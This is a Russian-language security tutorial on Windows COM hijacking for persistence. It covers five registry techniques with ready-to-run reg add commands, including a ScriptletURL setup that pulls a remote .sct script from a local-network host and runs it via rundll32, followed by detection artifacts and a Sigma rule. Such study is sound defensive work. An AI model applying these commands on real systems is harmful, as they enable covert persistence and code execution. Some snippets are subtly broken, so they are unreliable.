

В операционных системах семейства Windows технология Component Object Model (COM) является фундаментальным механизмом, обеспечивающим взаимодействие между различными программными компонентами. Эта архитектура, несмотря на свою мощь и гибкость, открывает широкие возможности для злоумышленников. Одним из таких векторов атаки является COM Hijacking. 

Данный метод позволяет легитимному приложению или системному процессу выполнить вредоносный код путем подмены записей реестра, связанных с COM-объектами. Принцип атаки основан на том, что при создании COM-объекта операционная система обращается к реестру для определения местоположения исполняемого файла (библиотеки или приложения). Если злоумышленник может изменить этот путь, система загрузит или запустит его вредоносный код от имени доверенного процесса, что делает этот метод крайне эффективным для закрепления в системе, обхода привилегий или выполнения кода. 

В данной статье мы подробно рассмотрим пять основных техник COM Hijacking, выделим основные артефакты, которые генерируют эти действия и реализуем правило детекции для обнаружении подобной активности.

## 1. InprocServer32. Подмена DLL

Это наиболее распространенный метод атаки. Его суть заключается в эксплуатации приоритета записей в кусте реестра текущего пользователя (`HKCU`) над записями локальной машины (`HKLM`). Легитимное приложение запрашивает создание COM-объекта через функцию `CoCreateInstance`. Система, следуя алгоритму поиска, сначала проверяет наличие CLSID в `HKCU\Software\Classes`. Если злоумышленник создал там соответствующую ветку и указал в ключе `InProcServer32` путь к своей DLL, система загрузит именно её, проигнорировав оригинальную DLL, зарегистрированную в `HKLM`. Этот метод особенно опасен, так как позволяет внедрить код в контекст легитимного приложения. В основном, используются запланированные задачи, контекстные меню проводника, панели управления, COM-компоненты браузеров.

Для поиска потенциальных целей можно использовать готовые инструменты, например, [модуль PowerShell](https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Get-ScheduledTaskComHandler.ps1) для анализа обработчиков COM в запланированных задачах:


```powershell
Import-Module .\Get-ScheduledTaskComHandler.ps1

Get-ScheduledTaskComHandler -PersistenceLocations
```

![](../../Attachments/hij0.png)

Установка вредоносной DLL производится путем добавления или изменения соответствующих ключей реестра:

```powershell
REG ADD "HKCU\SOFTWARE\Classes\CLSID\{0358B920-0AC7-461F-98F4-58E32CD89148}\InProcServer32" /ve /t REG_EXPAND_SZ /d "C:\Path\To\evil.dll" /f
```

```powershell
REG ADD "HKCU\SOFTWARE\Classes\CLSID\{0358B920-0AC7-461F-98F4-58E32CD89148}\InProcServer32" /v ThreadingModel /t REG_SZ /d "Both" /f
```

![](../../Attachments/hij1.gif)

## 2. LocalServer32. Подмена исполняемого файла

Данный метод является аналогом предыдущего, но вместо библиотек DLL нацелен на исполняемые файлы (EXE). Некоторые COM-объекты реализованы как отдельные процессы, и в реестре для них указан путь к EXE-файлу в ключе `LocalServer32`. При запросе такого объекта система запускает указанный исполняемый файл. Если злоумышленнику удастся подменить этот путь, то при обращении к COM-объекту будет запущен его вредоносный код.

**Ключевая особенность:**  
Подмена `LocalServer32` также подвержена приоритету `HKCU` над `HKLM`. Даже если объект зарегистрирован только в защищенном `HKLM`, злоумышленник может создать запись в `HKCU` с тем же CLSID. Система, следуя приоритету, запустит бинарный файл, указанный в ветке пользователя.

Создание подмены в пользовательской ветке реестра:

```powershell
REG ADD "HKEY_CLASSES_ROOT\CLSID\{45EAE363-122A-445A-97B6-3DE890E786F8}\LocalServer32" /ve /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
```

![](../../Attachments/hij3.png)


Здесь есть интересная лазейка: поскольку HKCR показывает объединенное представление двух веток (**`HKCU\Software\Classes`** и **`HKLM\Software\Classes`**), то мы можем воспользоваться приоритетом их выбора. Нам известно, что наличие записи в HKCR говорит нам о существовании ветки либо в HKLM, либо в HKCU. 
В данном случае, запись есть только HKLM (HKCR), и она недоступна нам для изменения от имени обычного доменного пользователя. Однако, воспользовавшись "главенством" HKCU над HKLM, мы можем добавить эту ветку с интересующим нас бинарным файлом.

```powershell
REG ADD "HKCU\SOFTWARE\Classes\CLSID\{45EAE363-122A-445A-97B6-3DE890E786F8}\LocalServer32" /ve /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
```

Для проверки можно принудительно создать экземпляр объекта по его CLSID:

```powershell
[activator]::CreateInstance([type]::GetTypeFromCLSID("45EAE363-122A-445A-97B6-3DE890E786F8"))
```


![](../../Attachments/hij2.png)

## 3. TreatAs. Перенаправление на другой CLSID

Эта техника является более изощренной и гибкой. Вместо подмены пути к существующему объекту, злоумышленник создает свой собственный COM-объект (любого типа: InProc или Local), а затем использует ключ `TreatAs`, чтобы "перенаправить" на него запросы к оригинальному CLSID. Когда система встречает ключ `TreatAs` для запрошенного CLSID, она игнорирует оригинальный объект и создает экземпляр того объекта, который указан в этом ключе.

#### InProcServer

Сначала создается свой объект, например, с типом InProcServer32, который запускает калькулятор:

```powershell
REG ADD "HKCU\SOFTWARE\Classes\CLSID\{12345678-1234-1234-1234-123456789012}\InProcServer32" /ve /t REG_EXPAND_SZ /d "C:\path\to\malicious.dll" /f
```

Затем создается ключ `TreatAs` для целевого объекта, указывающий на созданный фейковый CLSID:

```powershell
REG ADD "HKCU\SOFTWARE\Classes\CLSID\{0002DF01-0000-0000-C000-000000000046}\TreatAs" /ve /t REG_SZ /d "{12345678-1234-1234-1234-123456789012}" /f
```

Теперь любой запрос на создание объекта Internet Explorer приведет к запуску калькулятора:

```powershell
New-Object -ComObject InternetExplorer.Application.1
```

![](../../Attachments/hij4.png)

#### LocalServer

Аналогично для LocalServer:

```powershell
REG ADD "HKCU\SOFTWARE\Classes\CLSID\{12345678-1234-1234-1234-1234567890AB}" /ve /t REG_SZ /d "test" /f
```

```powershell
REG ADD "HKCU\SOFTWARE\Classes\CLSID\{12345678-1234-1234-1234-1234567890AB}\LocalServer32" /ve /t REG_EXPAND_SZ /d "C:\Windows\System32\calc.exe" /f
```

```powershell
REG ADD "HKCU\SOFTWARE\Classes\CLSID\{0002DF01-0000-0000-C000-000000000046}\TreatAs" /ve /t REG_SZ /d "{12345678-1234-1234-1234-1234567890AB}" /f
```

```powershell
New-Object -ComObject InternetExplorer.Application.1
```

![](../../Attachments/hij5.png)

## 4. ProgID/VersionIndependentProgID. Подмена через человекочитаемое имя

Многие приложения и скрипты обращаются к COM-объектам не напрямую по CLSID, а по их текстовым идентификаторам - ProgID (например, `WScript.Shell`). Техника атаки заключается в перенаправлении этих запросов. Злоумышленник создает свой CLSID и регистрирует его под нужным ProgID. Когда приложение запрашивает объект по этому ProgID, система возвращает CLSID злоумышленника.

### ProgID + LocalServer32

Создаем свой COM-объект (например, LocalServer32)

```powershell
REG ADD "HKCU\SOFTWARE\Classes\CLSID\{12345678-1234-1234-1234-1234567890AB}" /ve /t REG_SZ /d "ComHijacking" /f
```

```powershell
REG ADD "HKCU\SOFTWARE\Classes\CLSID\{12345678-1234-1234-1234-1234567890AB}\LocalServer32" /ve /t REG_EXPAND_SZ /d "C:\Windows\System32\calc.exe" /f
```

Указываем, что наш объект должен быть известен как ProgID "WScript.Shell.1"

```powershell
REG ADD "HKCU\SOFTWARE\Classes\CLSID\{12345678-1234-1234-1234-1234567890AB}\ProgID" /ve /t REG_SZ /d "WScript.Shell.1" /f
```

Создаем запись для самого ProgID, указывающую на наш CLSID

```powershell
REG ADD "HKCU\SOFTWARE\Classes\WScript.Shell.1" /ve /t REG_SZ /d "" /f
```

```powershell
REG ADD "HKCU\SOFTWARE\Classes\WScript.Shell.1\CLSID" /ve /t REG_SZ /d "{12345678-1234-1234-1234-1234567890AB}" /f
```

Запрос на создание объекта:

```powershell
New-Object -ComObject WScript.Shell.1
```

![](../../Attachments/hij6.png)

### VersionIndependentProgID + InProcServer32

Аналогично для VersionIndependentProgID:

```powershell
REG ADD "HKCU\SOFTWARE\Classes\CLSID\{12345678-1234-1234-1234-1234567890AB}" /ve /t REG_SZ /d "ComHijacking" /f
```

```powershell
REG ADD "HKCU\SOFTWARE\Classes\CLSID\{12345678-1234-1234-1234-1234567890AB}\InProcServer32" /ve /t REG_EXPAND_SZ /d "C:\path\to\malicious.dll" /f
```

```powershell
REG ADD "HKCU\SOFTWARE\Classes\CLSID\{12345678-1234-1234-1234-1234567890AB}\VersionIndependentProgID" /ve /t REG_SZ /d "WScript.Shell" /f
```

```powershell
REG ADD "HKCU\SOFTWARE\Classes\WScript.Shell" /ve /t REG_SZ /d "" /f
```

```powershell
REG ADD "HKCU\SOFTWARE\Classes\WScript.Shell\CLSID" /ve /t REG_SZ /d "{12345678-1234-1234-1234-1234567890AB}" /f
```

```powershell
New-Object -ComObject WScript.Shell
```

![](../../Attachments/hij7.png)

## 5. Подмена с использованием ScriptetURL

Это наиболее продвинутая и скрытная техника, использующая легитимный системный компонент `scrobj.dll`. Этот метод позволяет COM-объекту быть реализованным в виде скрипта (JScript, VBScript), который может загружаться по сети. Злоумышленник регистрирует COM-объект, указывая в качестве сервера `scrobj.dll`, а в специальном ключе `ScriptletURL` - URL к своему вредоносному скрипту. При активации такого COM-объекта система загружает скрипт с удаленного сервера и выполняет его в контексте вызвавшего приложения.

Регистрация объекта с указанием на удаленный скрипт:

```powershell
reg add "HKCU\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /d "ComHijackingViaScriptlet" /f

reg add "HKCU\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /d "C:\Windows\System32\scrobj.dll" /f

reg add "HKCU\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /d "Apartment" /f

reg add "HKCU\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID" /ve /d "Hijack.Scriptlets" /f

reg add "HKCU\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID" /ve /d "Hijack.Scriptlets" /f

reg add "HKCU\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /d "http://192.168.1.3/script.sct" /f

reg add "HKCU\SOFTWARE\Classes\Hijack.Scriptlets" /ve /d "" /f

reg add "HKCU\SOFTWARE\Classes\Hijack.Scriptlets\CLSID" /ve /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f

```

Содержимое удаленного скрипта (`script.sct`):

```xml
<?XML version="1.0"?>
<scriptlet>

<registration
    description="Hijack.Scriptlets"
    progid="Hijack.Scriptlets"
    version="1"
    classid="{00000001-0000-0000-0000-0000FEEDACDC}"
    remotable="true"
>
</registration>

<script language="JScript">
<![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("calc.exe", 0, false);
)>
</script>

</scriptlet>
```

Активировать объект можно, например, с помощью `rundll32.exe`:

```powershell
rundll32.exe -sta "{00000001-0000-0000-0000-0000FEEDACDC}"
```

![](../../Attachments/hij8.png)

# Артефакты

Все техники COM Hijacking, так или иначе, оставляют следы в двух основных местах: в реестре и в журналах процессов. 

Рассмотрим ключевые артефакты, которые генерируют описанные выше действия:

#### Модификация реестра (Sysmon Event ID 13, Windows Event ID 4657)

Самый прямой и неизбежный артефакт - это запись об изменении значения в реестре. Любая команда `reg add` или прямое редактирование реестра будет зафиксирована

![](../../Attachments/hij9.png)

![](../../Attachments/hij13.png)

#### Запуск процесса reg.exe (Sysmon Event ID 1, Windows Event ID 4688)

Чтобы изменить реестр, злоумышленник часто использует утилиту `reg.exe`. Её запуск с определенными аргументами - сильный индикатор.

![](../../Attachments/hij10.png|697)

![](../../Attachments/hij11.png)

#### Подозрительный скрипт PowerShell (Windows Event ID 4104)

Если злоумышленник использовал powershell, мы также можем отследить активность с помощью регистрации скрипт-блоков.

![](../../Attachments/hij12.png)

# Детекция

Основываясь на описанных выше артефактах, мы можем построить правило, которое будет обнаруживать попытки COM Hijacking. Представленное sigma-правило объединяет несколько ключевых индикаторов.

```yaml
title: Detecting COM object Hijacking For Persistence With Suspicious Locations
status: experimental
description: Обнаруживает потенциальный захват COM-объекта
author: artrone
references:
    - https://pentestlab.blog/2020/05/20/persistence-com-hijacking/
date: 2026/03/15
modified: 2022/03/15
logsource:
    product: windows
tags:
    - attack.persistence
    - attack.t1546.015
detection:
	selection_sysmon_13:
		EventID: 13
		EventType: "SetValue"
	selection_msgid_4657:
		EventID: 4657
	selection_sysmon_1:
		EventID: 1
		OriginalFileName: "reg.exe"
		ParentImage|endswith:
			- "powershell.exe"
			- "pwsh.exe"
			- "powershell_ise.exe"
			- "cmd.exe"
	selection_msgid_4688:
		EventID: 4688
		NewProcessName|endswith: "reg.exe"
		ParentProcessName|endswith:
			- "powershell.exe"
			- "pwsh.exe"
			- "powershell_ise.exe"
			- "cmd.exe"
	selection_posh_4104:
		EventID: 4104
		ScriptBlockText|contains|all:
			- "reg"
			- "add"
		ScriptBlockText|contains:
			- "\InprocServer32\(Default)"
			- "\LocalServer32\(Default)"
			- "\.exe\OpenWithProgids\exefile"
			- "\VersionIndependentProgID"
			- "\ProgID"
	args:
		CommandLine|contains|all:
			- "reg"
			- "add"
	paths|contains:
		TargetObject:
			- "\InprocServer32\(Default)"
			- "\LocalServer32\(Default)"
			- "\.exe\OpenWithProgids\exefile"
			- "\VersionIndependentProgID"
			- "\ProgID"

    condition: ((selection_sysmon_13 or selection_msgid_4657) and paths) or ((selection_sysmon_1 or selection_msgid_4688) and paths and args) or selection_posh_4104
falsepositives:
    - Probable legitimate applications
level: high
```
